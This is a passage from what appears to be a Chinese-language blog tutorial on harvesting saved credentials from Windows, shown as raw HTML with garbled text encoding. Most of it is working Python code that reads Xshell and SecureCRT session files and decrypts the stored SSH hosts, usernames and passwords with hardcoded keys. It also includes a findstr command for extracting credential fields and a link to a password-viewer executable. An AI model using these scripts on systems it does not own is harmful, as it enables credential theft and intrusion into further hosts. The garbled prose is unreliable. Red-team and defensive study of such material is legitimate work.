class="string">&quot;.xsh&quot;</span>) <span class="keyword">or</span> f.endswith(<span class="string">&quot;.xfp&quot;</span>):</span><br><span class="line">            filepath = os.path.join(root, f)</span><br><span class="line">            cfg = configparser.ConfigParser()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cfg.read(filepath)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                cfg.read(filepath, encoding=<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xsh&quot;</span>):</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                print(</span><br><span class="line">                    <span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nHost:     <span class="subst">&#123;host&#125;</span>\nUsername: <span class="subst">&#123;username&#125;</span>\nPassword: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nError:<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Xshell-7"><a href="#Xshell-7" class="headerlink" title="Xshell 7"></a>Xshell 7</h4><p>è¿™ä¸ªç‰ˆæœ¬ç›®å‰æˆ‘æ²¡æœ‰æ‰¾åˆ°è§£å¯†æ–¹å¼ï¼Œåªèƒ½ä½¿ç”¨æ¯”è¾ƒè ¢çš„æ–¹å¼</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/20.gif" alt="1"></p><p>æ˜Ÿå·å¯†ç æŸ¥çœ‹å™¨ï¼š<a href="https://github.com/Ascotbe/Random-img/blob/master/WindowsGrabPassword/ViewPass.exe">å¤‡ä»½ä¸‹è½½</a></p><h3 id="SecureCRTå¯†ç "><a href="#SecureCRTå¯†ç " class="headerlink" title="SecureCRTå¯†ç "></a>SecureCRTå¯†ç </h3><p>ä¿å­˜ä½ç½®å¦‚ä¸‹ï¼Œç»¿è‰²ç‰ˆæœ¬çš„è¯åœ¨ä¸‹è½½çš„æ–‡ä»¶å¤¹ä¸­</p><table><thead><tr><th>ç‰ˆæœ¬</th><th>è·¯å¾„</th></tr></thead><tbody><tr><td>å…¨ç‰ˆæœ¬é€šç”¨</td><td>%APPDATA%\VanDyke\Config\Sessions</td></tr></tbody></table><h4 id="å°äº7-Xç‰ˆæœ¬"><a href="#å°äº7-Xç‰ˆæœ¬" class="headerlink" title="å°äº7.Xç‰ˆæœ¬"></a>å°äº7.Xç‰ˆæœ¬</h4><p>æŠŠ<code>*.ini</code>æ–‡ä»¶æ‹‰å–ä¸‹æ¥ç›´æ¥ä½¿ç”¨è„šæœ¬è§£å¯†ï¼Œè¿™ä¸ªç‰ˆæœ¬æ²¡æœ‰æµ‹è¯•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt SSHv2 passwords stored in VanDyke SecureCRT session files</span></span><br><span class="line"><span class="comment"># Can be found on Windows in:</span></span><br><span class="line"><span class="comment">#   %APPDATA%\VanDyke\Config\Sessions\sessionname.ini</span></span><br><span class="line"><span class="comment"># Tested with version 7.2.6 (build 606) for Windows</span></span><br><span class="line"><span class="comment"># Eloi Vanderbeken - Synacktiv</span></span><br><span class="line"><span class="comment">#  Decrypt SSHv2 passwords stored in VanDyke SecureCRT</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py -h</span></span><br><span class="line"><span class="comment"># usage: SecureCRT-decryptpass.py [-h] files [files ...]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#positional arguments:</span></span><br><span class="line"><span class="comment">#  files       session file(s)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#optional arguments:</span></span><br><span class="line"><span class="comment">#  -h, --help  show this help message and exit</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># ssh -p 22 user@192.168.0.1 # 123456</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">password</span>) :</span></span><br><span class="line">    c1 = Blowfish.new(<span class="string">&#x27;5F B0 45 A2 94 17 D9 16 C6 C6 A2 FF 06 41 82 B7&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    c2 = Blowfish.new(<span class="string">&#x27;24 A6 3D DE 5B D3 B3 82 9C 7E 06 F4 08 16 AA 07&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    padded = c1.decrypt(c2.decrypt(password.decode(<span class="string">&#x27;hex&#x27;</span>))[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> padded[:<span class="number">2</span>] != <span class="string">&#x27;\x00\x00&#x27;</span> :</span><br><span class="line">        p += padded[:<span class="number">2</span>]</span><br><span class="line">        padded = padded[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> p.decode(<span class="string">&#x27;UTF-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">REGEX_HOSTNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Hostname&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line">REGEX_PASWORD = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Password&quot;=u([0-9a-f]+)&#x27;</span>)</span><br><span class="line">REGEX_PORT = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;D:&quot;\[SSH2\] Port&quot;=([0-9a-f]&#123;8&#125;)&#x27;</span>)</span><br><span class="line">REGEX_USERNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Username&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hostname</span>(<span class="params">x</span>) :</span></span><br><span class="line">    m = REGEX_HOSTNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">password</span>(<span class="params">x</span>) :</span></span><br><span class="line">    m = REGEX_PASWORD.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> decrypt(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">port</span>(<span class="params">x</span>) :</span></span><br><span class="line">    m = REGEX_PORT.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-p %d &#x27;</span>%(<span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">username</span>(<span class="params">x</span>) :</span></span><br><span class="line">    m = REGEX_USERNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>) + <span class="string">&#x27;@&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;files&#x27;</span>, <span class="built_in">type</span>=argparse.FileType(<span class="string">&#x27;r&#x27;</span>), nargs=<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="built_in">help</span>=<span class="string">&#x27;session file(s)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> args.files :</span><br><span class="line">    c = f.read().replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> f.name</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ssh %s%s%s # %s&quot;</span>%(port(c), username(c), hostname(c), password(c))</span><br></pre></td></tr></table></figure><h4 id="7-Xç‰ˆæœ¬"><a href="#7-Xç‰ˆæœ¬" class="headerlink" title="7.Xç‰ˆæœ¬"></a>7.Xç‰ˆæœ¬</h4><p>è¿›å…¥ç›®å½•æå–æ–‡ä»¶ä¸­çš„è¿æ¥IPã€ç«¯å£ã€è´¦å·ã€hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr &#x2F;si &#x2F;c:&quot;Hostname&quot; &#x2F;c:&quot;\&quot;Username\&quot;&#x3D;&quot; &#x2F;c:&quot;\&quot;Password\&quot;&#x3D;&quot; &#x2F;c:&quot;\&quot;[SSH2] Port\&quot;&#x3D;&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/21.png" alt="image-20210611152808283"></p><p>ç„¶åä½¿ç”¨è„šæœ¬è¿›è¡Œè§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨æ„å»é™¤hashçš„ç¬¬ä¸€ä½ &quot;u&quot;</span><br><span class="line">python3  SecureCRT.py dec hash</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/22.png" alt="image-20210611153105145"></p><p>è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, Blowfish</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureCRTCrypto</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCrypto object.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.IV = <span class="string">b&#x27;\x00&#x27;</span> * Blowfish.block_size</span><br><span class="line">        self.Key1 = <span class="string">b&#x27;\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07&#x27;</span></span><br><span class="line">        self.Key2 = <span class="string">b&#x27;\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        plain_bytes += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">        padded_plain_bytes = plain_bytes + os.urandom(Blowfish.block_size - <span class="built_in">len</span>(plain_bytes) % Blowfish.block_size)</span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(self.Key1, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        cipher2 = Blowfish.new(self.Key2, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher1.encrypt(os.urandom(<span class="number">4</span>) + cipher2.encrypt(padded_plain_bytes) + os.urandom(<span class="number">4</span>)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(self.Key1, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        cipher2 = Blowfish.new(self.Key2, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        ciphered_bytes = <span class="built_in">bytes</span>.fromhex(Ciphertext)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ciphered_bytes) &lt;= <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        padded_plain_bytes = cipher2.decrypt(cipher1.decrypt(ciphered_bytes)[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">        </span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_plain_bytes), <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> padded_plain_bytes[i] == <span class="number">0</span> <span class="keyword">and</span> padded_plain_bytes[i + <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">0</span>:i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">raise</span>(ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureCRTCryptoV2</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ConfigPassphrase : <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCryptoV2 object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            ConfigPassphrase: The config passphrase that SecureCRT uses. Leave it empty if config passphrase is not set.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.IV = <span class="string">b&#x27;\x00&#x27;</span> * AES.block_size</span><br><span class="line">        self.Key = SHA256.new(ConfigPassphrase.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) &gt; <span class="number">0xffffffff</span>:</span><br><span class="line">            <span class="keyword">raise</span> OverflowError(<span class="string">&#x27;Plaintext is too long.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        plain_bytes = \</span><br><span class="line">            <span class="built_in">len</span>(plain_bytes).to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            SHA256.new(plain_bytes).digest()</span><br><span class="line">        padded_plain_bytes = \</span><br><span class="line">            plain_bytes + \</span><br><span class="line">            os.urandom(AES.block_size - <span class="built_in">len</span>(plain_bytes) % AES.block_size)</span><br><span class="line">        cipher = AES.new(self.Key, AES.MODE_CBC, iv = self.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher.encrypt(padded_plain_bytes).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        cipher = AES.new(self.Key, AES.MODE_CBC, iv = self.IV)</span><br><span class="line">        padded_plain_bytes = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(Ciphertext))</span><br><span class="line">        </span><br><span class="line">        plain_bytes_length = <span class="built_in">int</span>.from_bytes(padded_plain_bytes[<span class="number">0</span>:<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        plain_bytes = padded_plain_bytes[<span class="number">4</span>:<span class="number">4</span> + plain_bytes_length]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes) != plain_bytes_length:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        plain_bytes_digest = padded_plain_bytes[<span class="number">4</span> + plain_bytes_length:<span class="number">4</span> + plain_bytes_length + SHA256.digest_size]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain_bytes_digest) != SHA256.digest_size:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> SHA256.new(plain_bytes).digest() != plain_bytes_digest:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Invalid Ciphertext.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> plain_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Help</span>():</span></span><br><span class="line">        print(<span class="string">&#x27;Usage:&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    SecureCRTCipher.py &lt;enc|dec&gt; [-v2] [-p ConfigPassphrase] &lt;plaintext|ciphertext&gt;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    &lt;enc|dec&gt;              &quot;enc&quot; for encryption, &quot;dec&quot; for decryption.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                           This parameter must be specified.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;    [-v2]                  Encrypt/Decrypt with &quot;Password V2&quot; algorithm.&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;                     